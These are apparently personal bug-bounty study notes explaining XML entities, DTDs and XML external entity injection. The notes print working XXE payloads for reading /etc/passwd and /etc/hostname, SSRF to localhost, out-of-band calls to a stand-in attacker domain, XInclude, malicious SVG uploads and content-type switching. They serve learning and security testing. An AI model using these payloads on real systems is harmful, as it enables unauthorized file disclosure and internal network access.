---
title: XXE
date: 2025-09-26
categories: [Notes, XXE]
tags: [notes, bugs] # TAG names always lowercase
description: Notes on XXE.
---

# XXEi "Xml eXternal Entitiy injection"

### What is xml?

XML stands for **extensible markup language**, which is a language designed for transporting and storing data.

Unlike html, xml does not use predefined tags, so that tags can be given names that describe it’s content. 

ex: 

```xml
<?xml version="1.0"?> <!-- metadata "optional" -->
<Person>    <!-- root Tag "every xml document should has a root element -->
<Name>John</Name>
<Age>20</Age>
</Person>
```

> in xml, tag names are case sensetive

Certain characters like `<>'"` are not allowed in xml document directly, instead it is denoted with a build in entity `&lt;` for `<` and `&gt;` for `>`

### What is xml entitiy?

XML documents are defined using the XML 1.0 standard, which includes the concept of an **“entity”** that stores data. Several kinds of entities can access data locally or remotely through a **system** identifier. An external entity, or external general parameter-parsed entity, can request and receive data, including confidential data.

Think about entities like variables that stores data which can be used later multiple times.

xml entity is a way of representing data in xml by denoting the predifined entity name rather than typing the data itself.

To access entity we use `&entityname;`

Various entities are built in to the specification of the XML language. For example, the entities `&lt;` and `&gt;` represent the characters `<` and `>` .

These entities are defined in a different part of the document called document type definition **DTD** 

### What is DTD?

DTD stands for document type definition, which contains declaration that can define the structure of an xml document, type of data and other items.

The DTD can be fully self-contained within the document itself (known as an "internal DTD") or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.

DTD is used to define entities

```xml
<?xml version="1.0"?>
<!DOCTYPE Person [
<! ENTITY name "John">
]>
<Person>
<Name>&name;</Name>
<Age>20</Age>
</Person>
```

### what is xml enteties?

XML allows custom entities to be defined within the DTD. For example:

```xml
<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]> 
```

This definition means that any usage of the entity reference `&myentity;` within the XML document will be replaced with the defined value: "`my entity value`".

There are three types of entities:

- General
- Predifined
- Parameter

**Predefined** entities like `&lt;` for `<` 

**General** entities are like what we have used previously

```xml
<?xml version="1.0"?>
<!DOCTYPE Person [
<! ENTITY name "John">
]>
<Person>
<Name>&name;</Name>
<Age>20</Age>
</Person>
```

**Parameter** entities are some how special because

- They are only allowed to be refrenced inside a DTD.
- It can also carry any data like the general entities.
- They are more flexible for ex, it allows you to create an entity which denotes for another entity
    
    ```xml
    <! ENTITY % outer "<!ENTITY inner 'John'>">
    ```
    

### Loading external DTD

DTD can be also loaded externaly like the entities

```xml
<!DOCTYPE exdt SYSTEM "my-dtd.dtd"> 
```

### What is xxe?

xxe stands for **xml external entity** injection which is a web security vulnerability that allows an attacker to interfere with an applications’ processing of xml data

it often allows an attacker to view files on the application server filesystem, or to interact with the back-end servers or external servers that the application can access.

sometimes it can be escalated to perform ssrf attack.

XML external entities are a type of custom entity of which definition is located outside of the DTD where they are declared.

The declaration of an external entity uses the `SYSTEM` keyword and must specify a URL from which the value of the entity should be loaded. For example:

```
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
```

The URL can use the `file://` protocol, and so external entities can be loaded from file. For example:

```
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```

### How xxe vulnerabilities arise?

xxe arrive because xml has various potentialy dangerous features, and standard xml parsers support these features by default even if it’s not used by the web application.

### Exploiting xxe to retrieve files

in order to perform a system file read you need to introduce a **DOCTYPE** element that defines an external entity containing the path to the file, for ex:

```jsx
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///path/to/file"> ]>
```

then use the external entity you defined `xxe` by adding `&` in front of it and `;` after it to be

`&xxe;` 

### Exploiting xxe to perform an ssrf attack

to perform an ssrf attack using xxe we can use the same way as above but replacing the `file://` schema with the `http://` schema

```jsx
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1"> ]>
```

### Exploiting blind xxe to perform oob interaction

sometime the application may be vulnerable to xxe injection but the result of the injection is not directly shown in the response, so you need to use an oob interaction to make sure whether the application is vulnerable or not.

```jsx
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://your-server/"> ]>
```

its better to use a host name in the url instead of ip to know wheathe there is a dns interaction or not.

### bypass filters using parameter entities

Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:

```xml
<!ENTITY % myparameterentity "my parameter entity value" > 
```

And second, parameter entities are referenced using the percent character instead of the usual ampersand:

```xml
%myparameterentity; 
```

This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]> 
```

This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.

if you have found an oob using xxe this referance will be the best to follow

[What is a blind XXE attack? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/xxe/blind)

### CDATA

```xml
<![CDATA[ <text> ]]>
```

### Xinclude

`XInclude` is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an `XInclude` attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.

To perform an `XInclude` attack, you need to reference the `XInclude` namespace and provide the path to the file that you wish to include. For example:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo> 
```

### xxe attack via file upload

Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.

For example, an application might allow users to upload images, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.

ex for svg file

```jsx
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

### xxe attacks via modified content type

Most POST requests use a default content type that is generated by HTML forms, such as `application/x-www-form-urlencoded`. Some web sites expect to receive requests in this format but will tolerate other content types, including XML.

For example, if a normal request contains the following:

```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Then you might be able submit the following request, with the same result:

```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

If the application tolerates requests containing XML in the message body, and parses the body content as XML, then you can reach the hidden XXE attack surface simply by reformatting requests to use the XML format.

[bypass waf](https://www.notion.so/bypass-waf-0b3f533a9c984a4691084a01c99b073c?pvs=21)

### **Where to look for XXE?**

In a nutshell, XXE should be tested whenever XML is parsed, which is probably more common than you think. Below is a list of ideas:

- XML APIs
- SOAP APIs
- Anywhere that a Microsoft office (docx/xlxs/pptx/etc.) file is parsed. These are just zip files filled with XML files.
- RSS feed parsers (RSS feeds are just XML)
- SAML Authentication
- HTML parsing (for example, converting HTML to a PDF)
- Functionality that parses sitemap.xml files
- Functionality that parses SVG files

### Note

- don’t forget to test xxe in file upload functions
- test xxe in various inputs not just xml inputs
- try to change the content type to xml and notice the responce
- when you get burp pro study blind xxe

## Resources

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- cheatsheet: https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md
- https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
- best video explaination: https://www.youtube.com/watch?v=gjm6VHZa_8s

[Checklist](https://www.notion.so/Checklist-d10acafbba1d44ce97f5ac564c3c25fe?pvs=21)
